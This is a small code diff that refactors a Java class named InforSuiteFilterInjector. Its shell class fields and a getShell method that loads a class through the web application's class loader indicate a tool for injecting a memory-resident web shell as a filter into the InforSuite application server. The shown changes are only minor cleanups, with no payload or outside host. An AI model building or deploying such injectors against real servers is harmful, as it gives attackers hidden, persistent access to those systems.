@@ -16,7 +16,7 @@ import java.util.zip.GZIPInputStream;
 public class InforSuiteFilterInjector {
 
  
-    private static boolean ok = false;
+    private static boolean ok;
 
     private static String shellClassName;
     private static String shellClass;
@@ -32,9 +32,7 @@ public class InforSuiteFilterInjector {
         } catch (Throwable throwable) {
           
         }
-        if (contexts == null || contexts.isEmpty()) {
-            
-        } else {
+        if (contexts != null) {
             for (Object context : contexts) {
                 try {
                    
@@ -85,7 +83,7 @@ public class InforSuiteFilterInjector {
    
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
